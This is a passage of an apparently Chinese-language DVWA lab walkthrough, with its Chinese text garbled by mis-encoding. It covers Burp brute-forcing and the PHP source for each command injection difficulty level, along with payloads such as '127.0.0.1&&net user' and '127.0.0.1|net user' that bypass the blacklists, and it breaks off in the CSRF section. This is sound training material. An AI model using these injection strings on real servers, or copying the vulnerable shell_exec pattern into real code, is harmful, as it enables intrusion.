id="3-åœ¨Optionsä¸­æ‰¾åˆ°Request-Engineæ¨¡å—ï¼ŒæŠŠçº¿ç¨‹æ•°è®¾ä¸º1"><a href="#3-åœ¨Optionsä¸­æ‰¾åˆ°Request-Engineæ¨¡å—ï¼ŒæŠŠçº¿ç¨‹æ•°è®¾ä¸º1" class="headerlink" title="3.åœ¨Optionsä¸­æ‰¾åˆ°Request Engineæ¨¡å—ï¼ŒæŠŠçº¿ç¨‹æ•°è®¾ä¸º1"></a>3.åœ¨Optionsä¸­æ‰¾åˆ°Request Engineæ¨¡å—ï¼ŒæŠŠçº¿ç¨‹æ•°è®¾ä¸º1</h5><h5 id="4-åœ¨Optionsä¸­æ‰¾åˆ°Rediectionsæ¨¡å—ï¼Œé€‰æ‹©alwaysï¼Œå…è®¸é‡å®šå‘"><a href="#4-åœ¨Optionsä¸­æ‰¾åˆ°Rediectionsæ¨¡å—ï¼Œé€‰æ‹©alwaysï¼Œå…è®¸é‡å®šå‘" class="headerlink" title="4.åœ¨Optionsä¸­æ‰¾åˆ°Rediectionsæ¨¡å—ï¼Œé€‰æ‹©alwaysï¼Œå…è®¸é‡å®šå‘"></a>4.åœ¨Optionsä¸­æ‰¾åˆ°Rediectionsæ¨¡å—ï¼Œé€‰æ‹©alwaysï¼Œå…è®¸é‡å®šå‘</h5><h5 id="5-åœ¨Optionsä¸­æ‰¾åˆ°Grep-Extractæ¨¡å—ï¼Œç‚¹å‡»Addï¼Œå¹¶è®¾ç½®ç­›é€‰æ¡ä»¶ï¼Œå¾—åˆ°user-token"><a href="#5-åœ¨Optionsä¸­æ‰¾åˆ°Grep-Extractæ¨¡å—ï¼Œç‚¹å‡»Addï¼Œå¹¶è®¾ç½®ç­›é€‰æ¡ä»¶ï¼Œå¾—åˆ°user-token" class="headerlink" title="5.åœ¨Optionsä¸­æ‰¾åˆ°Grep-Extractæ¨¡å—ï¼Œç‚¹å‡»Addï¼Œå¹¶è®¾ç½®ç­›é€‰æ¡ä»¶ï¼Œå¾—åˆ°user_token"></a>5.åœ¨Optionsä¸­æ‰¾åˆ°Grep-Extractæ¨¡å—ï¼Œç‚¹å‡»Addï¼Œå¹¶è®¾ç½®ç­›é€‰æ¡ä»¶ï¼Œå¾—åˆ°user_token</h5><h5 id="6-åœ¨Payloadsä¸­ä¸ºé€‰æ‹©çš„å‚æ•°è®¾ç½®å­—å…¸"><a href="#6-åœ¨Payloadsä¸­ä¸ºé€‰æ‹©çš„å‚æ•°è®¾ç½®å­—å…¸" class="headerlink" title="6.åœ¨Payloadsä¸­ä¸ºé€‰æ‹©çš„å‚æ•°è®¾ç½®å­—å…¸"></a>6.åœ¨Payloadsä¸­ä¸ºé€‰æ‹©çš„å‚æ•°è®¾ç½®å­—å…¸</h5><h5 id="7-ç‚¹å‡»start-attackï¼Œå¼€å§‹çˆ†ç ´"><a href="#7-ç‚¹å‡»start-attackï¼Œå¼€å§‹çˆ†ç ´" class="headerlink" title="7.ç‚¹å‡»start attackï¼Œå¼€å§‹çˆ†ç ´"></a>7.ç‚¹å‡»start attackï¼Œå¼€å§‹çˆ†ç ´</h5><h5 id="æ ¹æ®è¿”å›žé•¿åº¦çš„å¤§å°ï¼Œå¯ä»¥å¾—åˆ°æ­£ç¡®çš„ç”¨æˆ·å¯†ç "><a href="#æ ¹æ®è¿”å›žé•¿åº¦çš„å¤§å°ï¼Œå¯ä»¥å¾—åˆ°æ­£ç¡®çš„ç”¨æˆ·å¯†ç " class="headerlink" title="æ ¹æ®è¿”å›žé•¿åº¦çš„å¤§å°ï¼Œå¯ä»¥å¾—åˆ°æ­£ç¡®çš„ç”¨æˆ·å¯†ç "></a>æ ¹æ®è¿”å›žé•¿åº¦çš„å¤§å°ï¼Œå¯ä»¥å¾—åˆ°æ­£ç¡®çš„ç”¨æˆ·å¯†ç </h5><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code>&lt;?phpif( isset( $_POST[ 'Login' ] ) &amp;&amp; isset ($_POST['username']) &amp;&amp; isset ($_POST['password']) ) {    // Check Anti-CSRF token---æ ¡éªŒtoken    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );    // Sanitise username input----è¿‡æ»¤ã€è½¬ä¹‰ç”¨æˆ·è¾“å…¥çš„username    $user = $_POST[ 'username' ];    $user = stripslashes( $user );    $user = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    // Sanitise password input----è¿‡æ»¤ã€è½¬ä¹‰ç”¨æˆ·è¾“å…¥çš„password    $pass = $_POST[ 'password' ];    $pass = stripslashes( $pass );    $pass = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    $pass = md5( $pass );    // Default values    $total_failed_login = 3;    $lockout_time       = 15;    $account_locked     = false;    // Check the database (Check user information)ã€€ã€€ // ç”¨äº†æ›´ä¸ºå®‰å…¨çš„PDOï¼ˆPHP Data Objectï¼‰æœºåˆ¶é˜²å¾¡sqlæ³¨å…¥ï¼Œè¿™æ˜¯å› ä¸ºä¸èƒ½ä½¿ç”¨PDOæ‰©å±•æœ¬èº«æ‰§è¡Œä»»ä½•æ•°æ®åº“æ“ä½œï¼Œè€Œsqlæ³¨å…¥çš„å…³é”®å°±æ˜¯é€šè¿‡ç ´åsqlè¯­å¥ç»“æž„æ‰§è¡Œæ¶æ„çš„sqlå‘½ä»¤    $data = $db-&gt;prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' );    $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR );    $data-&gt;execute();    $row = $data-&gt;fetch();    // Check to see if the user has been locked out.----ç™»å½•å¤±è´¥é”å®šæœºåˆ¶ï¼š3æ¬¡å¤±è´¥ï¼Œé”å®š15åˆ†é’Ÿ    if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ 'failed_login' ] &gt;= $total_failed_login ) )  {        // User locked out.  Note, using this method would allow for user enumeration!        //$html .= "&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;";        // Calculate when the user would be allowed to login again        $last_login = strtotime( $row[ 'last_login' ] );        $timeout    = $last_login + ($lockout_time * 60);        $timenow    = time();        /*        print "The last login was: " . date ("h:i:s", $last_login) . "&lt;br /&gt;";        print "The timenow is: " . date ("h:i:s", $timenow) . "&lt;br /&gt;";        print "The timeout is: " . date ("h:i:s", $timeout) . "&lt;br /&gt;";        */        // Check to see if enough time has passed, if it hasn't locked the account        if( $timenow &lt; $timeout ) {            $account_locked = true;            // print "The account is locked&lt;br /&gt;";        }    }    // Check the database (if username matches the password)----å°è¯•ç™»å½•ï¼ŒPDOæœºåˆ¶é˜²å¾¡SQLæ³¨å…¥    $data = $db-&gt;prepare( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );    $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR);    $data-&gt;bindParam( ':password', $pass, PDO::PARAM_STR );    $data-&gt;execute();    $row = $data-&gt;fetch();    // If its a valid login...    if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) {        // Get users details        $avatar       = $row[ 'avatar' ];        $failed_login = $row[ 'failed_login' ];        $last_login   = $row[ 'last_login' ];        // Login successful        $html .= "&lt;p&gt;Welcome to the password protected area &lt;em&gt;{$user}&lt;/em&gt;&lt;/p&gt;";        $html .= "&lt;img src=\"{$avatar}\" /&gt;";        // Had the account been locked out since last login?        if( $failed_login &gt;= $total_failed_login ) {            $html .= "&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;";            $html .= "&lt;p&gt;Number of login attempts: &lt;em&gt;{$failed_login}&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;${last_login}&lt;/em&gt;.&lt;/p&gt;";        }        // Reset bad login count        $data = $db-&gt;prepare( 'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;' );        $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR );        $data-&gt;execute();    } else {        // Login failed----å¦‚æžœç™»å½•å¤±è´¥ï¼Œéšæœºç­‰å¾…2-4ç§’åŽå†è¿”å›žé”™è¯¯ä¿¡æ¯        sleep( rand( 2, 4 ) );        // Give the user some feedback        $html .= "&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in {$lockout_time} minutes&lt;/em&gt;.&lt;/pre&gt;";        // Update bad login count        $data = $db-&gt;prepare( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' );        $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR );        $data-&gt;execute();    }    // Set the last login time    $data = $db-&gt;prepare( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' );    $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR );    $data-&gt;execute();}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><p>ä»¥çœ‹åˆ°ï¼ŒImpossibleçº§åˆ«çš„ä»£ç åŠ å…¥äº†Anti-CSRF tokenï¼ŒåŒæ—¶å¯¹å‚æ•°ipè¿›è¡Œäº†ä¸¥æ ¼çš„é™åˆ¶ï¼Œåªæœ‰è¯¸å¦‚â€œæ•°å­—.æ•°å­—.æ•°å­—.æ•°å­—â€çš„è¾“å…¥æ‰ä¼šè¢«æŽ¥æ”¶æ‰§è¡Œï¼Œå› æ­¤ä¸å­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´žã€‚</p><p>è¿™ä¸ªç¡®å®žå·²ç»ç»“åˆä¸šåŠ¡åœºæ™¯æ¥è¿›è¡Œçº¦æŸäº†ã€‚</p><p><strong>æš´åŠ›ç ´è§£é˜²æŠ¤å»ºè®®ï¼š</strong></p><p>&lt;1&gt;ç™»å½•é¡µé¢é‡‡ç”¨æœ‰æ•ˆçš„éªŒè¯ç æœºåˆ¶<br>&lt;2&gt;å¯¹ç”¨æˆ·å¯†ç é”™è¯¯çš„æ¬¡æ•°åšé™åˆ¶</p><h1 id="Command-Injectionï¼ˆå‘½ä»¤æ³¨å…¥ï¼‰"><a href="#Command-Injectionï¼ˆå‘½ä»¤æ³¨å…¥ï¼‰" class="headerlink" title="Command Injectionï¼ˆå‘½ä»¤æ³¨å…¥ï¼‰"></a>Command Injectionï¼ˆå‘½ä»¤æ³¨å…¥ï¼‰</h1><h2 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h2><pre><code>&lt;?phpif( isset( $_POST[ 'Submit' ]  ) ) {    // Get input//èŽ·å–IPå­—æ®µ    $target = $_REQUEST[ 'ip' ];    // Determine OS and execute the ping command.//ç¡®å®šæ“ä½œç³»ç»Ÿå¹¶æ‰§è¡Œpingå‘½ä»¤// stristr(string,search,before_search)//stristrå‡½æ•°æœç´¢å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­çš„ç¬¬ä¸€æ¬¡å‡ºçŽ°ï¼Œè¿”å›žå­—ç¬¦ä¸²çš„å‰©ä½™éƒ¨åˆ†ï¼ˆä»ŽåŒ¹é…//ç‚¹ï¼‰ï¼Œå¦‚æžœæœªæ‰¾åˆ°æ‰€æœç´¢çš„å­—ç¬¦ä¸²ï¼Œåˆ™è¿”å›žFALSEã€‚å‚æ•°stringè§„å®šè¢«æœç´¢çš„å­—ç¬¦ä¸²ï¼Œå‚//æ•°searchè§„å®šè¦æœç´¢çš„å­—ç¬¦ä¸²ï¼ˆå¦‚æžœè¯¥å‚æ•°æ˜¯æ•°å­—ï¼Œåˆ™æœç´¢åŒ¹é…è¯¥æ•°å­—å¯¹åº”çš„ASCIIå€¼//çš„å­—ç¬¦ï¼‰ï¼Œå¯é€‰å‚æ•°before_trueä¸ºå¸ƒå°”åž‹ï¼Œé»˜è®¤ä¸ºâ€œfalseâ€ï¼Œå¦‚æžœè®¾ç½®ä¸ºâ€œtrueâ€ï¼Œå‡½//æ•°å°†è¿”å›žsearchå‚æ•°ç¬¬ä¸€æ¬¡å‡ºçŽ°ä¹‹å‰çš„å­—ç¬¦ä¸²éƒ¨åˆ†ã€‚// php_uname(mode)//è¿™ä¸ªå‡½æ•°ä¼šè¿”å›žè¿è¡Œphpçš„æ“ä½œç³»ç»Ÿçš„ç›¸å…³æè¿°ï¼Œå‚æ•°modeå¯å–å€¼â€aâ€ ï¼ˆæ­¤ä¸ºé»˜è®¤ï¼ŒåŒ…//å«åºåˆ—â€s n r v mâ€é‡Œçš„æ‰€æœ‰æ¨¡å¼ï¼‰ï¼Œâ€s â€ï¼ˆè¿”å›žæ“ä½œç³»ç»Ÿåç§°ï¼‰ï¼Œâ€nâ€ï¼ˆè¿”å›žä¸»æœºåï¼‰ï¼Œâ€ //râ€ï¼ˆè¿”å›žç‰ˆæœ¬åç§°ï¼‰ï¼Œâ€vâ€ï¼ˆè¿”å›žç‰ˆæœ¬ä¿¡æ¯ï¼‰ï¼Œ â€mâ€ï¼ˆè¿”å›žæœºå™¨ç±»åž‹ï¼‰ã€‚    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {        // Windows        $cmd = shell_exec( 'ping  ' . $target );    }    else {        // *nix        $cmd = shell_exec( 'ping  -c 4 ' . $target );    }    // Feedback for the end user    echo "&lt;pre&gt;{$cmd}&lt;/pre&gt;";}?&gt;</code></pre><p><strong>tristr(string,search,before_search)</strong></p><p>stristrå‡½æ•°æœç´¢å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­çš„ç¬¬ä¸€æ¬¡å‡ºçŽ°ï¼Œè¿”å›žå­—ç¬¦ä¸²çš„å‰©ä½™éƒ¨åˆ†ï¼ˆä»ŽåŒ¹é…ç‚¹ï¼‰ï¼Œå¦‚æžœæœªæ‰¾åˆ°æ‰€æœç´¢çš„å­—ç¬¦ä¸²ï¼Œåˆ™è¿”å›ž  FALSEã€‚å‚æ•°stringè§„å®šè¢«æœç´¢çš„å­—ç¬¦ä¸²ï¼Œå‚æ•°searchè§„å®šè¦æœç´¢çš„å­—ç¬¦ä¸²ï¼ˆå¦‚æžœè¯¥å‚æ•°æ˜¯æ•°å­—ï¼Œåˆ™æœç´¢åŒ¹é…è¯¥æ•°å­—å¯¹åº”çš„ ASCII  å€¼çš„å­—ç¬¦ï¼‰ï¼Œå¯é€‰å‚æ•°before_trueä¸ºå¸ƒå°”åž‹ï¼Œé»˜è®¤ä¸ºâ€œfalseâ€ ï¼Œå¦‚æžœè®¾ç½®ä¸º â€œtrueâ€ï¼Œå‡½æ•°å°†è¿”å›ž search  å‚æ•°ç¬¬ä¸€æ¬¡å‡ºçŽ°ä¹‹å‰çš„å­—ç¬¦ä¸²éƒ¨åˆ†ã€‚</p><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td><em>string</em></td><td>å¿…éœ€ã€‚è§„å®šè¢«æœç´¢çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td><em>search</em></td><td>å¿…éœ€ã€‚è§„å®šæ‰€æœç´¢çš„å­—ç¬¦ä¸²ã€‚å¦‚æžœè¯¥å‚æ•°æ˜¯æ•°å­—ï¼Œåˆ™æœç´¢åŒ¹é…è¯¥æ•°å­—å¯¹åº”çš„ ASCII å€¼çš„å­—ç¬¦ã€‚</td></tr><tr><td><em>before_search</em></td><td>å¯é€‰ã€‚ä¸€ä¸ªé»˜è®¤å€¼ä¸º â€œfalseâ€ çš„å¸ƒå°”å€¼ã€‚å¦‚æžœè®¾ç½®ä¸º â€œtrueâ€ï¼Œå®ƒå°†è¿”å›ž <em>search</em> å‚æ•°ç¬¬ä¸€æ¬¡å‡ºçŽ°ä¹‹å‰çš„å­—ç¬¦ä¸²éƒ¨åˆ†ã€‚</td></tr></tbody></table><p><a href="https://www.runoob.com/php/func-string-stristr.html">https://www.runoob.com/php/func-string-stristr.html</a></p><p><strong>php_uname(mode)</strong></p><p>è¿™ä¸ªå‡½æ•°ä¼šè¿”å›žè¿è¡Œphpçš„æ“ä½œç³»ç»Ÿçš„ç›¸å…³æè¿°ï¼Œå‚æ•°modeå¯å–å€¼â€aâ€ ï¼ˆæ­¤ä¸ºé»˜è®¤ï¼ŒåŒ…å«åºåˆ—â€s n r v mâ€é‡Œçš„æ‰€æœ‰æ¨¡å¼ï¼‰ï¼Œâ€s  â€ï¼ˆè¿”å›žæ“ä½œç³»ç»Ÿåç§°ï¼‰ï¼Œâ€nâ€ï¼ˆè¿”å›žä¸»æœºåï¼‰ï¼Œâ€ râ€ï¼ˆè¿”å›žç‰ˆæœ¬åç§°ï¼‰ï¼Œâ€vâ€ï¼ˆè¿”å›žç‰ˆæœ¬ä¿¡æ¯ï¼‰ï¼Œ â€mâ€ï¼ˆè¿”å›žæœºå™¨ç±»åž‹ï¼‰ã€‚</p><p>å¯ä»¥çœ‹åˆ°ï¼ŒæœåŠ¡å™¨é€šè¿‡åˆ¤æ–­æ“ä½œç³»ç»Ÿæ‰§è¡Œä¸åŒpingå‘½ä»¤ï¼Œä½†æ˜¯å¯¹ipå‚æ•°å¹¶æœªåšä»»ä½•çš„è¿‡æ»¤ï¼Œå¯¼è‡´äº†ä¸¥é‡çš„å‘½ä»¤æ³¨å…¥æ¼æ´žã€‚</p><p>windowå’Œlinuxç³»ç»Ÿéƒ½å¯ä»¥ç”¨&amp;&amp;æ¥æ‰§è¡Œå¤šæ¡å‘½ä»¤</p><pre><code>127.0.0.1&amp;&amp;net user</code></pre><pre><code>127.0.0.1&amp;&amp;dir</code></pre><h2 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2><pre><code>&lt;?phpif( isset( $_POST[ 'Submit' ]  ) ) {    // Get input    $target = $_REQUEST[ 'ip' ];    // Set blacklist//è®¾ç½®å‘½ä»¤é»‘åå•ï¼Œé‡Œé¢åŒ…å«&amp;&amp;å’Œï¼›    $substitutions = array(        '&amp;&amp;' =&gt; '',        ';'  =&gt; '',    );    // Remove any of the charactars in the array (blacklist).//å°†å‚æ•°ä¸­æœ‰&amp;&amp;å’Œï¼›çš„éƒ½æ›¿æ¢æˆç©º    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );    // Determine OS and execute the ping command.    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {        // Windows        $cmd = shell_exec( 'ping  ' . $target );    }    else {        // *nix        $cmd = shell_exec( 'ping  -c 4 ' . $target );    }    // Feedback for the end user    echo "&lt;pre&gt;{$cmd}&lt;/pre&gt;";}?&gt;</code></pre><h3 id="str-replace-find-replace-string"><a href="#str-replace-find-replace-string" class="headerlink" title="str_replace(find,replace,string)"></a><strong>str_replace(find,replace,string)</strong></h3><p>æŠŠå­—ç¬¦ä¸² string ä¸­çš„å­—ç¬¦ find æ›¿æ¢ä¸º replace</p><h4 id="DOSä¸­-amp-ç”¨æ³•"><a href="#DOSä¸­-amp-ç”¨æ³•" class="headerlink" title="DOSä¸­&amp;ç”¨æ³•"></a>DOSä¸­&amp;ç”¨æ³•</h4><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯â€&amp;&amp;â€ä¸Žâ€ &amp;â€çš„åŒºåˆ«ï¼š</p><p>Command 1&amp;&amp;Command 2</p><p>å…ˆæ‰§è¡ŒCommand 1ï¼Œæ‰§è¡ŒæˆåŠŸåŽæ‰§è¡ŒCommand 2ï¼Œå¦åˆ™ä¸æ‰§è¡ŒCommand 2</p><p>Command 1&amp;Command 2</p><p>å…ˆæ‰§è¡ŒCommand 1ï¼Œä¸ç®¡æ˜¯å¦æˆåŠŸï¼Œéƒ½ä¼šæ‰§è¡ŒCommand 2</p><pre><code>127.0.0.1&amp;ipconfig</code></pre><p>ç”±äºŽä½¿ç”¨çš„æ˜¯str_replaceæŠŠâ€&amp;&amp;â€ ã€â€;â€æ›¿æ¢ä¸ºç©ºå­—ç¬¦ï¼Œå› æ­¤å¯ä»¥é‡‡ç”¨ä»¥ä¸‹æ–¹å¼ç»•è¿‡ï¼š</p><pre><code>127.0.0.1&amp;;&amp;ipconfig</code></pre><h2 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h2><pre><code>&lt;?phpif( isset( $_POST[ 'Submit' ]  ) ) {    // Get input    $target = trim($_REQUEST[ 'ip' ]);    // Set blacklist//è®¾ç½®å‘½ä»¤é»‘åå•ï¼Œé‡Œé¢åŒ…å«&amp; ï¼›| - $ ( ) \ ' ||    $substitutions = array(        '&amp;'  =&gt; '',        ';'  =&gt; '',        '| ' =&gt; '',        '-'  =&gt; '',        '$'  =&gt; '',        '('  =&gt; '',        ')'  =&gt; '',        '`'  =&gt; '',        '||' =&gt; '',    );    // Remove any of the charactars in the array (blacklist).//æ›¿æ¢æˆç©º    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );    // Determine OS and execute the ping command.    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {        // Windows        $cmd = shell_exec( 'ping  ' . $target );    }    else {        // *nix        $cmd = shell_exec( 'ping  -c 4 ' . $target );    }    // Feedback for the end user    echo "&lt;pre&gt;{$cmd}&lt;/pre&gt;";}?&gt;</code></pre><p>è¿™é‡Œå§&amp; ï¼›| - $ ( ) \ â€˜ ||åˆ¸æ›¿</p><p>Command 1 | Command 2</p><p>â€œ|â€æ˜¯ç®¡é“ç¬¦ï¼Œè¡¨ç¤ºå°†Command 1çš„è¾“å‡ºä½œä¸ºCommand 2çš„è¾“å…¥ï¼Œå¹¶ä¸”åªæ‰“å°Command 2æ‰§è¡Œçš„ç»“æžœã€‚</p><p>é»‘åå•çœ‹ä¼¼è¿‡æ»¤äº†æ‰€æœ‰çš„éžæ³•å­—ç¬¦ï¼Œä½†ä»”ç»†è§‚å¯Ÿåˆ°æ˜¯æŠŠâ€| â€ï¼ˆæ³¨æ„è¿™é‡Œ|åŽæœ‰ä¸€ä¸ªç©ºæ ¼ï¼‰æ›¿æ¢ä¸ºç©ºå­—ç¬¦ï¼ŒäºŽæ˜¯ â€|â€æˆäº†â€œæ¼ç½‘ä¹‹é±¼â€ã€‚</p><p>6666</p><p>127.0.0.1|net user</p><h4 id="å¯ç”¨trim-å‡½æ•°è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå› ä¸º-trim-str-å¯ä»¥åˆ é™¤å­—ç¬¦ä¸²å·¦å³ä¸¤è¾¹çš„ç©ºæ ¼ã€‚"><a href="#å¯ç”¨trim-å‡½æ•°è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå› ä¸º-trim-str-å¯ä»¥åˆ é™¤å­—ç¬¦ä¸²å·¦å³ä¸¤è¾¹çš„ç©ºæ ¼ã€‚" class="headerlink" title="å¯ç”¨trim()å‡½æ•°è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå› ä¸º trim(str) å¯ä»¥åˆ é™¤å­—ç¬¦ä¸²å·¦å³ä¸¤è¾¹çš„ç©ºæ ¼ã€‚"></a>å¯ç”¨trim()å‡½æ•°è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå› ä¸º trim(str) å¯ä»¥åˆ é™¤å­—ç¬¦ä¸²å·¦å³ä¸¤è¾¹çš„ç©ºæ ¼ã€‚</h4><h2 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code>&lt;?phpif( isset( $_POST[ 'Submit' ]  ) ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );    // Get input    $target = $_REQUEST[ 'ip' ];// stripslasheså‡½æ•°ä¼šåˆ é™¤å­—ç¬¦ä¸²stringä¸­çš„åæ–œæ ï¼Œè¿”å›žå·²å‰¥ç¦»åæ–œæ çš„å­—ç¬¦ä¸²ã€‚    $target = stripslashes( $target );    // Split the IP into 4 octects//å°†å…·ä½“çš„IPä»¥.åˆ†éš”// explode(separator,string,limit)æŠŠå­—ç¬¦ä¸²æ‰“æ•£ä¸ºæ•°ç»„ï¼Œè¿”å›žå­—ç¬¦ä¸²çš„æ•°ç»„ã€‚å‚æ•°separatorè§„å®šåœ¨å“ªé‡Œåˆ†å‰²å­—ç¬¦ä¸²ï¼Œå‚æ•°stringæ˜¯è¦åˆ†å‰²çš„å­—ç¬¦ä¸²ï¼Œå¯é€‰å‚æ•°limitè§„å®šæ‰€è¿”å›žçš„æ•°ç»„å…ƒç´ çš„æ•°ç›®ã€‚    $octet = explode( ".", $target );    // Check IF each octet is an integer//æ£€æŸ¥æ˜¯å¦åˆ†æˆäº†4å—ï¼Œå¹¶ä¸”æ¯ä¸€å—æ˜¯å¦éƒ½ä¸ºæ•°å­—// s_numeric(string)æ£€æµ‹stringæ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ï¼Œå¦‚æžœæ˜¯è¿”å›žTRUEï¼Œå¦åˆ™è¿”å›žFALSEã€‚    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) {        // If all 4 octets are int's put the IP back together.        $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];        // Determine OS and execute the ping command.        if( stristr( php_uname( 's' ), 'Windows NT' ) ) {            // Windows            $cmd = shell_exec( 'ping  ' . $target );        }        else {            // *nix            $cmd = shell_exec( 'ping  -c 4 ' . $target );        }        // Feedback for the end user        echo "&lt;pre&gt;{$cmd}&lt;/pre&gt;";    }    else {        // Ops. Let the user name theres a mistake        echo '&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;';    }}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œæœ¬ç­‰çº§çš„æœåŠ¡å™¨æºä»£ç å·²è¢«é‡å†™ï¼Œåªå…è®¸éžå¸¸ä¸¥æ ¼çš„è¾“å…¥ã€‚ å¦‚æžœä¸åŒ¹é…å¹¶ä¸”æ²¡æœ‰äº§ç”Ÿç‰¹å®šç»“æžœï¼Œåˆ™å°†ä¸å…è®¸æ‰§è¡Œå®ƒã€‚ ç›¸æ¯”äºŽå‰é¢2ä¸ªç­‰çº§çš„â€œé»‘åå•â€è¿‡æ»¤ï¼ˆå…è®¸ä»»ä½•è¾“å…¥å¹¶åˆ é™¤ä¸éœ€è¦çš„å†…å®¹ï¼‰ï¼Œä½¿ç”¨â€œ<strong>ç™½åå•</strong>â€ï¼ˆä»…å…è®¸è¾“å…¥ipåœ°å€ï¼‰æ›´åŠ å®‰å…¨ã€‚</p><h1 id="CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰"><a href="#CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰" class="headerlink" title="CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰"></a>CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰</h1><p>CSRFï¼Œå…¨ç§°Cross-site request forgeryï¼Œç¿»è¯‘è¿‡æ¥å°±æ˜¯è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œæ˜¯æŒ‡åˆ©ç”¨å—å®³è€…å°šæœªå¤±æ•ˆçš„èº«ä»½è®¤è¯ä¿¡æ¯ï¼ˆcookieã€ä¼šè¯ç­‰ï¼‰ï¼Œè¯±éª—å…¶ç‚¹å‡»æ¶æ„é“¾æŽ¥æˆ–è€…è®¿é—®åŒ…å«æ”»å‡»ä»£ç çš„é¡µé¢ï¼Œåœ¨å—å®³äººä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ä»¥å—å®³è€…çš„èº«ä»½å‘ï¼ˆèº«ä»½è®¤è¯ä¿¡æ¯æ‰€å¯¹åº”çš„ï¼‰æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œä»Žè€Œå®Œæˆéžæ³•æ“ä½œï¼ˆå¦‚è½¬è´¦ã€æ”¹å¯†ç­‰ï¼‰ã€‚</p><pre><code>&lt;?phpif( isset( $_GET[ 'Change' ] ) ) {    // Get input    $pass_new  = $_GET[ 'password_new' ];    $pass_conf = $_GET[ 'password_conf' ];    // æ ¡éªŒå¯†ç     if( $pass_new == $pass_conf ) {        // Tç›¸åŒä½¿ç”¨mysqli-real-escape-stringå‡½æ•°è½¬ä¹‰        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));        $pass_new = md5( $pass_new );//md5åŠ å¯†pass_new        // æ›´æ–°æ•°æ®åº“å¯†ç         $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : 